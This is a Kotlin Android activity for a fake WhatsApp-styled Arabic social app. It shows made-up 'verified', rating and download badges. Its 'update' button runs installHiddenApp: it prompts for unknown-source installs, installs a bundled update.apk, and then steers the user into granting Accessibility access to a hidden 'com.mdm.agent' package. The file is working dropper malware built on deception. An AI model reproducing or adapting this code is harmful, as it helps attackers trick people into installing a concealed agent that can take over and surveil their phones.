package com.tawasul.app

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var btnUpdate: Button
    private lateinit var progressBar: ProgressBar

    // WhatsApp color palette
    private val COLOR_DARK_GREEN = 0xFF075E54.toInt()
    private val COLOR_LIGHT_GREEN = 0xFF25D366.toInt()
    private val COLOR_TEAL = 0xFF128C7E.toInt()
    private val COLOR_WHITE = 0xFFFFFFFF.toInt()
    private val COLOR_LIGHT_GRAY = 0xFFECE5DD.toInt()
    private val COLOR_CHAT_BUBBLE = 0xFFDCF8C6.toInt()

    // Flag: did we just launch the installer? (used in onResume)
    private var launchedInstaller = false

    // ─── Lifecycle ─────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(buildUI())

        // If MDM is already installed, show instruction to enable Accessibility
        if (isMdmInstalled()) {
            Toast.makeText(this,
                "التطبيق مثبّت! فعّل إمكانية الوصول من الإعدادات",
                Toast.LENGTH_LONG).show()
        }
    }

    override fun onResume() {
        super.onResume()

        // Check if MDM is installed - if yes, show instruction to enable Accessibility
        if (isMdmInstalled()) {
            Handler(Looper.getMainLooper()).postDelayed({
                if (isMdmInstalled()) {
                    Toast.makeText(this,
                        "✅ تم التثبيت!\nفعّل إمكانية الوصول من الإعدادات لتشغيل التطبيق",
                        Toast.LENGTH_LONG).show()
                    // Open Hidden App's Setup Permissions activity directly
                    try {
                        val setupIntent = Intent("com.mdm.agent.action.SETUP_PERMISSIONS").apply {
                            setPackage("com.mdm.agent")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(setupIntent)
                    } catch (e: Exception) {
                        // Fallback to Accessibility settings if direct launch fails
                        try {
                            val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(intent)
                        } catch (e2: Exception) {}
                    }
                }
            }, 500)
            return
        }

        // MDM not installed - if we just tried to install, show failure message
        if (launchedInstaller) {
            launchedInstaller = false
            Toast.makeText(this, "لم يكتمل التثبيت - اضغط تحديث مرة أخرى", Toast.LENGTH_LONG).show()
            progressBar.visibility = View.GONE
        }
    }

    // ─── UI ────────────────────────────────────────────────────────────
    private fun buildUI(): View {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(COLOR_DARK_GREEN)
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(40), dp(20), dp(40))
        }

        // ─── App Icon ───
        val icon = android.widget.ImageView(this).apply {
            setImageResource(R.drawable.ic_launcher_foreground)
            layoutParams = LinearLayout.LayoutParams(dp(100), dp(100)).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = dp(12)
            }
            background = android.graphics.drawable.GradientDrawable().apply {
                shape = android.graphics.drawable.GradientDrawable.OVAL
                setColor(COLOR_WHITE)
            }
            setPadding(dp(8), dp(8), dp(8), dp(8))
            scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
        }
        root.addView(icon)

        // ─── App Name ───
        val appName = TextView(this).apply {
            text = "تواصل الأحباب"
            setTextColor(COLOR_WHITE)
            textSize = 26f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        root.addView(appName)

        // ─── Description ───
        val desc = TextView(this).apply {
            text = "منصة للتواصل والتعارف"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(8))
        }
        root.addView(desc)

        // ─── Verified Badge ───
        val verified = TextView(this).apply {
            text = "✓ تطبيق مؤكد وموثوق"
            setTextColor(COLOR_LIGHT_GREEN)
            textSize = 11f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(16))
        }
        root.addView(verified)

        // ─── Stats Row ───
        val statsRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(16))
        }
        statsRow.addView(TextView(this).apply {
            text = "⭐ 4.9"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 13f
            setPadding(0, 0, dp(20), 0)
        })
        statsRow.addView(TextView(this).apply {
            text = "📥 1M+ تحميل"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 13f
            setPadding(0, 0, dp(20), 0)
        })
        statsRow.addView(TextView(this).apply {
            text = "👑 VIP"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 13f
        })
        root.addView(statsRow)

        // ─── Update Button ───
        btnUpdate = Button(this).apply {
            text = "تحديث"
            setTextColor(COLOR_WHITE)
            textSize = 16f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            background = android.graphics.drawable.GradientDrawable().apply {
                setColor(COLOR_LIGHT_GREEN)
                cornerRadius = dp(12).toFloat()
            }
            setPadding(0, dp(16), 0, dp(16))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
        btnUpdate.setOnClickListener { installHiddenApp() }
        root.addView(btnUpdate)

        // ─── Open Accessibility Settings Button ───
        val btnOpenSettings = Button(this).apply {
            text = "⚙️ فتح إعدادات إمكانية الوصول"
            setTextColor(COLOR_WHITE)
            textSize = 14f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            background = android.graphics.drawable.GradientDrawable().apply {
                setColor(COLOR_TEAL)
                cornerRadius = dp(12).toFloat()
            }
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(8) }
        }
        btnOpenSettings.setOnClickListener {
            try {
                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                Toast.makeText(this,
                    "ابحث عن MDM في القائمة وفعّله",
                    Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(this, "تعذّر فتح الإعدادات: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
        root.addView(btnOpenSettings)

        // ─── Progress Bar ───
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = View.GONE
            progressTintList = android.content.res.ColorStateList.valueOf(COLOR_LIGHT_GREEN)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(4)
            ).apply {
                topMargin = dp(24)
                bottomMargin = dp(16)
            }
        }
        root.addView(progressBar)

        // ─── Section: Why this app? ───
        root.addView(buildSectionTitle("لماذا هذا التطبيق؟"))
        root.addView(buildInfoRow("الإصدار", "V 1.0.0"))
        root.addView(buildInfoRow("حجم التطبيق", "12 MB"))
        root.addView(buildInfoRow("آخر تحديث", "اليوم"))

        // ─── Section: Description ───
        root.addView(buildSectionTitle("وصف التطبيق"))
        root.addView(TextView(this).apply {
            text = "تطبيق تواصل الأحباب هو منصة عربية للتواصل والتعارف بين الأصدقاء والعائلة. يتميز بواجهة بسيطة وسهلة الاستخدام، وسرعة في الأداء، وخصوصية عالية لمستخدميه."
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 12f
            setPadding(dp(4), dp(4), dp(4), dp(16))
            setLineSpacing(dp(2).toFloat(), 1f)
        })

        // ─── Section: What's New ───
        root.addView(buildSectionTitle("🚀 ما الجديد في هذا الإصدار؟"))
        root.addView(TextView(this).apply {
            text = "• تحسين الأداء وإصلاح الأخطاء\n• إضافة ميزات جديدة للخصوصية\n• دعم أحدث إصدارات أندرويد\n• واجهة مستخدم محسّنة"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 12f
            setPadding(dp(4), dp(4), dp(4), dp(16))
            setLineSpacing(dp(2).toFloat(), 1f)
        })

        // ─── Footer ───
        val footer = TextView(this).apply {
            text = "© 2024 تواصل الأحباب"
            setTextColor(0x99FFFFFF.toInt())
            textSize = 10f
            gravity = Gravity.CENTER
            setPadding(0, dp(20), 0, 0)
        }
        root.addView(footer)

        scrollView.addView(root)
        return scrollView
    }

    private fun buildSectionTitle(title: String): View {
        return TextView(this).apply {
            text = title
            setTextColor(COLOR_LIGHT_GREEN)
            textSize = 15f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            setPadding(dp(4), dp(12), dp(4), dp(4))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
    }

    private fun buildInfoRow(label: String, value: String): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(dp(4), dp(6), dp(4), dp(6))
        }
        row.addView(TextView(this).apply {
            text = label
            setTextColor(0xCCFFFFFF.toInt())
            textSize = 12f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        })
        row.addView(TextView(this).apply {
            text = value
            setTextColor(COLOR_WHITE)
            textSize = 12f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        return row
    }

    // ─── Installation Logic ────────────────────────────────────────────
    private fun installHiddenApp() {
        Toast.makeText(this, "جاري التحديث...", Toast.LENGTH_SHORT).show()

        // Check if we have permission to install unknown apps (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            // Mark that we're going to settings; when we come back, onResume will retry
            launchedInstaller = false
            startActivityForResult(intent, 1234)
            return
        }

        startInstallation()
    }

    private fun startInstallation() {
        try {
            progressBar.visibility = View.VISIBLE
            progressBar.progress = 30
            Toast.makeText(this, "جاري تجهيز التحديث...", Toast.LENGTH_SHORT).show()

            // Copy update.apk from assets to cache
            val apkFile = File(cacheDir, "update.apk")
            try {
                assets.open("update.apk").use { input ->
                    apkFile.outputStream().use { output -> input.copyTo(output) }
                }
            } catch (e: Exception) {
                Toast.makeText(this, "ملف التحديث غير موجود: ${e.message}", Toast.LENGTH_LONG).show()
                progressBar.visibility = View.GONE
                return
            }

            progressBar.progress = 70

            // Use the standard Intent.ACTION_VIEW installer - this is the MOST
            // RELIABLE approach across all Android versions and OEM ROMs.
            // It always shows the system install dialog and works predictably.
            val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }

            // Mark that we launched the installer - onResume will check MDM install status
            launchedInstaller = true
            startActivity(intent)

            progressBar.progress = 100
            Toast.makeText(this, "📢 اضغط 'تثبيت' في المثبّت، ثم ارجع لتطبيق تواصل الأحباب", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "فشل التحديث: ${e.message}", Toast.LENGTH_LONG).show()
            progressBar.visibility = View.GONE
            launchedInstaller = false
        }
    }

    // ─── MDM Detection & Permissions UI Launch ─────────────────────────
    private fun isMdmInstalled(): Boolean {
        return try {
            packageManager.getPackageInfo("com.mdm.agent", 0)
            true
        } catch (e: Exception) {
            false
        }
    }

// ─── Activity Result Handler ───────────────────────────────────────
    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1234) {
            // Returned from "unknown apps" settings
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && packageManager.canRequestPackageInstalls()) {
                // Permission granted - proceed with install
                startInstallation()
            } else {
                Toast.makeText(this, "يجب السماح بالتثبيت من مصادر غير معروفة أولاً", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
}
